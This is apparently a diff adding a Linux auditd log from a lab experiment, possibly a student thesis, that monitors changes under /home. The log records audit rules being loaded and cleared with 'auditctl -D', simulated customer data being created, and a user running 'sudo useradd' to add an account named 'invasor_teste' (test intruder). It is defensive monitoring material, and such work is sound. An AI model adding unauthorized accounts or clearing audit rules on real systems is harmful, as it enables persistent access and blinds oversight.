@@ -1,0 +1,339 @@
+----
+type=PROCTITLE msg=audit(11/11/2026 22:12:23.652:192) : proctitle=/sbin/auditctl -R /etc/audit/audit.rules 
+type=PATH msg=audit(11/11/2026 22:12:23.652:192) : item=0 name=/home inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(11/11/2026 22:12:23.652:192) : cwd=/ 
+type=SOCKADDR msg=audit(11/11/2026 22:12:23.652:192) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
+type=SYSCALL msg=audit(11/11/2026 22:12:23.652:192) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7ffe88544f50 a2=0x434 a3=0x0 items=1 ppid=21644 pid=21662 auid=unset uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=unset comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
+type=CONFIG_CHANGE msg=audit(11/11/2026 22:12:23.652:192) : auid=unset ses=unset subj=unconfined op=add_rule key=alteracao_home list=exit res=yes 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:12:23.971:233) : proctitle=/sbin/auditctl -R /etc/audit/audit.rules 
+type=SOCKADDR msg=audit(11/11/2026 22:12:23.971:233) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
+type=SYSCALL msg=audit(11/11/2026 22:12:23.971:233) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7ffe47b16ba0 a2=0x434 a3=0x0 items=0 ppid=21671 pid=21686 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
+type=CONFIG_CHANGE msg=audit(11/11/2026 22:12:23.971:233) : auid=pesquisador ses=3 subj=unconfined op=remove_rule key=alteracao_home list=exit res=yes 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:12:24.119:260) : proctitle=/sbin/auditctl -R /etc/audit/audit.rules 
+type=PATH msg=audit(11/11/2026 22:12:24.119:260) : item=0 name=/home inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(11/11/2026 22:12:24.119:260) : cwd=/root/tcc-scripts 
+type=SOCKADDR msg=audit(11/11/2026 22:12:24.119:260) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
+type=SYSCALL msg=audit(11/11/2026 22:12:24.119:260) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7ffe47b19030 a2=0x434 a3=0x0 items=1 ppid=21671 pid=21686 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
+type=CONFIG_CHANGE msg=audit(11/11/2026 22:12:24.119:260) : auid=pesquisador ses=3 subj=unconfined op=add_rule key=alteracao_home list=exit res=yes 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:12:24.498:576) : proctitle=install -d -o alvo -g alvo /home/alvo/dados_simulados 
+type=PATH msg=audit(11/11/2026 22:12:24.498:576) : item=0 name=/home inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(11/11/2026 22:12:24.498:576) : cwd=/home 
+type=SYSCALL msg=audit(11/11/2026 22:12:24.498:576) : arch=x86_64 syscall=mkdir success=no exit=EEXIST(Arquivo existe) a0=0x7fff67866709 a1=0755 a2=0x7fff67864fd0 a3=0x7fe5f80f0fe0 items=1 ppid=1228 pid=22150 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=install exe=/usr/bin/install subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:12:24.498:577) : proctitle=install -d -o alvo -g alvo /home/alvo/dados_simulados 
+type=PATH msg=audit(11/11/2026 22:12:24.498:577) : item=1 name=dados_simulados inode=783984 dev=08:01 mode=dir,700 ouid=root ogid=root rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(11/11/2026 22:12:24.498:577) : item=0 name=/home/alvo inode=783716 dev=08:01 mode=dir,700 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(11/11/2026 22:12:24.498:577) : cwd=/home/alvo 
+type=SYSCALL msg=audit(11/11/2026 22:12:24.498:577) : arch=x86_64 syscall=mkdir success=yes exit=0 a0=0x7fff6786670e a1=0700 a2=0x0 a3=0x7fe5f80f0fe0 items=2 ppid=1228 pid=22150 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=install exe=/usr/bin/install subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:12:24.526:578) : proctitle=install -d -o alvo -g alvo /home/alvo/dados_simulados 
+type=PATH msg=audit(11/11/2026 22:12:24.526:578) : item=0 name=(null) inode=783984 dev=08:01 mode=dir,700 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(11/11/2026 22:12:24.526:578) : cwd=/home/alvo 
+type=SYSCALL msg=audit(11/11/2026 22:12:24.526:578) : arch=x86_64 syscall=fchown success=yes exit=0 a0=0x3 a1=0x3e9 a2=0x3e9 a3=0x0 items=1 ppid=1228 pid=22150 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=install exe=/usr/bin/install subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:12:24.526:579) : proctitle=install -d -o alvo -g alvo /home/alvo/dados_simulados 
+type=PATH msg=audit(11/11/2026 22:12:24.526:579) : item=0 name=(null) inode=783984 dev=08:01 mode=dir,700 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(11/11/2026 22:12:24.526:579) : cwd=/home/alvo 
+type=SYSCALL msg=audit(11/11/2026 22:12:24.526:579) : arch=x86_64 syscall=fchmod success=yes exit=0 a0=0x3 a1=0755 a2=0x0 a3=0x0 items=1 ppid=1228 pid=22150 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=install exe=/usr/bin/install subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:12:24.530:585) : proctitle=chown alvo:alvo /home/alvo/dados_simulados/clientes.csv 
+type=PATH msg=audit(11/11/2026 22:12:24.530:585) : item=0 name=/home/alvo/dados_simulados/clientes.csv inode=783985 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(11/11/2026 22:12:24.530:585) : cwd=/root/tcc-scripts 
+type=SYSCALL msg=audit(11/11/2026 22:12:24.530:585) : arch=x86_64 syscall=fchownat success=yes exit=0 a0=AT_FDCWD a1=0x55c0fa603a70 a2=0x3e9 a3=0x3e9 items=1 ppid=1228 pid=22151 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=chown exe=/usr/bin/chown subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:24:29.775:25757) : proctitle=auditctl -D 
+type=SOCKADDR msg=audit(11/11/2026 22:24:29.775:25757) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
+type=SYSCALL msg=audit(11/11/2026 22:24:29.775:25757) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7ffc0cc95d80 a2=0x434 a3=0x0 items=0 ppid=22247 pid=47309 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts3 ses=3 comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
+type=CONFIG_CHANGE msg=audit(11/11/2026 22:24:29.775:25757) : auid=pesquisador ses=3 subj=unconfined op=remove_rule key=alteracao_home list=exit res=yes 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:24:54.136:25784) : proctitle=/sbin/auditctl -R /etc/audit/audit.rules 
+type=PATH msg=audit(11/11/2026 22:24:54.136:25784) : item=0 name=/home inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(11/11/2026 22:24:54.136:25784) : cwd=/root/tcc-scripts 
+type=SOCKADDR msg=audit(11/11/2026 22:24:54.136:25784) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
+type=SYSCALL msg=audit(11/11/2026 22:24:54.136:25784) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7ffde0dc8be0 a2=0x434 a3=0x0 items=1 ppid=72368 pid=72383 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts3 ses=3 comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
+type=CONFIG_CHANGE msg=audit(11/11/2026 22:24:54.136:25784) : auid=pesquisador ses=3 subj=unconfined op=add_rule key=alteracao_home list=exit res=yes 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:34:00.393:51090) : proctitle=auditctl -D 
+type=SOCKADDR msg=audit(11/11/2026 22:34:00.393:51090) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
+type=SYSCALL msg=audit(11/11/2026 22:34:00.393:51090) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7ffe06fd3ed0 a2=0x434 a3=0x0 items=0 ppid=72587 pid=97659 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
+type=CONFIG_CHANGE msg=audit(11/11/2026 22:34:00.393:51090) : auid=pesquisador ses=3 subj=unconfined op=remove_rule key=alteracao_home list=exit res=yes 
+----
+type=PROCTITLE msg=audit(11/11/2026 22:34:24.909:51117) : proctitle=/sbin/auditctl -R /etc/audit/audit.rules 
+type=PATH msg=audit(11/11/2026 22:34:24.909:51117) : item=0 name=/home inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(11/11/2026 22:34:24.909:51117) : cwd=/root/tcc-scripts 
+type=SOCKADDR msg=audit(11/11/2026 22:34:24.909:51117) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
+type=SYSCALL msg=audit(11/11/2026 22:34:24.909:51117) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7ffda5d7fae0 a2=0x434 a3=0x0 items=1 ppid=122728 pid=122743 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
+type=CONFIG_CHANGE msg=audit(11/11/2026 22:34:24.909:51117) : auid=pesquisador ses=3 subj=unconfined op=add_rule key=alteracao_home list=exit res=yes 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:03:04.023:52499) : proctitle=/sbin/auditctl -R /etc/audit/audit.rules 
+type=SOCKADDR msg=audit(12/11/2026 01:03:04.023:52499) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
+type=SYSCALL msg=audit(12/11/2026 01:03:04.023:52499) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7fffb298e7b0 a2=0x434 a3=0x0 items=0 ppid=124666 pid=124685 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
+type=CONFIG_CHANGE msg=audit(12/11/2026 01:03:04.023:52499) : auid=pesquisador ses=3 subj=unconfined op=remove_rule key=alteracao_home list=exit res=yes 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:03:04.183:52526) : proctitle=/sbin/auditctl -R /etc/audit/audit.rules 
+type=PATH msg=audit(12/11/2026 01:03:04.183:52526) : item=0 name=/home inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:03:04.183:52526) : cwd=/root/tcc-scripts 
+type=SOCKADDR msg=audit(12/11/2026 01:03:04.183:52526) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 } 
+type=SYSCALL msg=audit(12/11/2026 01:03:04.183:52526) : arch=x86_64 syscall=sendto success=yes exit=1076 a0=0x3 a1=0x7fffb2990c40 a2=0x434 a3=0x0 items=1 ppid=124666 pid=124685 auid=pesquisador uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts2 ses=3 comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null) 
+type=CONFIG_CHANGE msg=audit(12/11/2026 01:03:04.183:52526) : auid=pesquisador ses=3 subj=unconfined op=add_rule key=alteracao_home list=exit res=yes 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.932:53737) : proctitle=sudo useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.932:53737) : item=1 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:18:55.932:53737) : item=0 name=/home/alvo/ inode=783716 dev=08:01 mode=dir,700 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.932:53737) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.932:53737) : arch=x86_64 syscall=openat success=yes exit=6 a0=AT_FDCWD a1=0x561477ae1000 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=2 ppid=124803 pid=124846 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53795) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53795) : item=1 name=/home/invasor_teste inode=783987 dev=08:01 mode=dir,000 ouid=root ogid=root rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53795) : item=0 name=/home/ inode=783362 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53795) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53795) : arch=x86_64 syscall=mkdir success=yes exit=0 a0=0x7fffe3493230 a1=0000 a2=0xfffffffffffffeb8 a3=0x7fb860fa8fe0 items=2 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53796) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53796) : item=0 name=/home/invasor_teste inode=783987 dev=08:01 mode=dir,000 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53796) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53796) : arch=x86_64 syscall=chown success=yes exit=0 a0=0x7fffe3493230 a1=root a2=0x0 a3=0x7fb860fa8fe0 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53797) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53797) : item=0 name=/home/invasor_teste inode=783987 dev=08:01 mode=dir,000 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53797) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53797) : arch=x86_64 syscall=chmod success=yes exit=0 a0=0x7fffe3493230 a1=0755 a2=0x0 a3=0x7fb860fa8fe0 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53798) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53798) : item=0 name=/home/invasor_teste inode=783987 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53798) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53798) : arch=x86_64 syscall=chown success=yes exit=0 a0=0x56035d05da00 a1=invasor_teste a2=0x3ea a3=0x7fb860fa8fe0 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53799) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53799) : item=0 name=/home/invasor_teste inode=783987 dev=08:01 mode=dir,755 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53799) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53799) : arch=x86_64 syscall=chmod success=yes exit=0 a0=0x56035d05da00 a1=0700 a2=0x0 a3=0x7fb860fa8fe0 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53801) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53801) : item=1 name=.bashrc inode=783988 dev=08:01 mode=file,600 ouid=root ogid=root rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53801) : item=0 name=/home/alvo inode=783987 dev=08:01 mode=dir,700 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53801) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53801) : arch=x86_64 syscall=openat success=yes exit=7 a0=0x5 a1=0x56035d07e793 a2=O_WRONLY|O_CREAT|O_EXCL|O_TRUNC|O_NOFOLLOW|O_CLOEXEC a3=0x180 items=2 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53802) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53802) : item=0 name=(null) inode=783988 dev=08:01 mode=file,600 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53802) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53802) : arch=x86_64 syscall=fchown success=yes exit=0 a0=0x7 a1=0x3ea a2=0x3ea a3=0x180 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53803) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53803) : item=0 name=(null) inode=783988 dev=08:01 mode=file,600 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53803) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53803) : arch=x86_64 syscall=fchmod success=yes exit=0 a0=0x7 a1=0644 a2=0x3ea a3=0x180 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53804) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53804) : item=0 name=(null) inode=783988 dev=08:01 mode=file,644 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53804) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53804) : arch=x86_64 syscall=fsetxattr success=yes exit=0 a0=0x7 a1=0x7fb86103702f a2=0x56035d063e10 a3=0x1c items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53805) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53805) : item=1 name=.profile inode=783989 dev=08:01 mode=file,600 ouid=root ogid=root rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53805) : item=0 name=/home/alvo inode=783987 dev=08:01 mode=dir,700 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53805) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53805) : arch=x86_64 syscall=openat success=yes exit=7 a0=0x5 a1=0x56035d07e7cb a2=O_WRONLY|O_CREAT|O_EXCL|O_TRUNC|O_NOFOLLOW|O_CLOEXEC a3=0x180 items=2 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53806) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53806) : item=0 name=(null) inode=783989 dev=08:01 mode=file,600 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53806) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53806) : arch=x86_64 syscall=fchown success=yes exit=0 a0=0x7 a1=0x3ea a2=0x3ea a3=0x180 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:55.996:53807) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:55.996:53807) : item=0 name=(null) inode=783989 dev=08:01 mode=file,600 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:55.996:53807) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:55.996:53807) : arch=x86_64 syscall=fchmod success=yes exit=0 a0=0x7 a1=0644 a2=0x3ea a3=0x180 items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:56.000:53808) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:56.000:53808) : item=0 name=(null) inode=783989 dev=08:01 mode=file,644 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:56.000:53808) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:56.000:53808) : arch=x86_64 syscall=fsetxattr success=yes exit=0 a0=0x7 a1=0x7fb86103702f a2=0x56035d063e10 a3=0x1c items=1 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:56.000:53809) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:56.000:53809) : item=1 name=.bash_logout inode=783990 dev=08:01 mode=file,600 ouid=root ogid=root rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:18:56.000:53809) : item=0 name=/home/alvo inode=783987 dev=08:01 mode=dir,700 ouid=invasor_teste ogid=invasor_teste rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:56.000:53809) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:18:56.000:53809) : arch=x86_64 syscall=openat success=yes exit=7 a0=0x5 a1=0x56035d07e7eb a2=O_WRONLY|O_CREAT|O_EXCL|O_TRUNC|O_NOFOLLOW|O_CLOEXEC a3=0x180 items=2 ppid=124850 pid=124851 auid=alvo uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts4 ses=9 comm=useradd exe=/usr/sbin/useradd subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:18:56.000:53810) : proctitle=useradd -m -s /bin/bash invasor_teste 
+type=PATH msg=audit(12/11/2026 01:18:56.000:53810) : item=0 name=(null) inode=783990 dev=08:01 mode=file,600 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:18:56.000:53810) : cwd=/home/alvo 
